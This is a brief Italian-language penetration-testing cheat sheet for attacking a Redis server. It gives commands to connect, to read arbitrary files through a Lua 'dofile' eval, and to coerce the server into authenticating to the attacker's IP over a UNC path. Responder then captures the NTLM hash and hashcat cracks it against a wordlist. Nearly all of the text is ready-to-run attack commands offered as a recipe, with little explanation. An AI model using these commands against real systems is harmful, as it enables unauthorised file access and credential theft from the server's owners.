### **CONNETTERSI A REDIS**
```bash
redis-cli -h <ip>
```
### **LEGGERE FILE**
```bash
eval "dofile('<PATH>')" 0
```
### **DUMP USER NTLM HASH**
su redis
```bash
eval "dofile('//<TUO IP>/share')" 0 [
```
sulla tua macchina
```bash
sudo responder -I tun0 -dvw
```
![file://C:/Users/STRAOL~1/AppData/Local/Temp/.HAXM41/1.png](file://C:/Users/STRAOL~1/AppData/Local/Temp/.HAXM41/1.png)
```bash
hashcat -a 0 -m 5600 hash $ROCKYOU
```
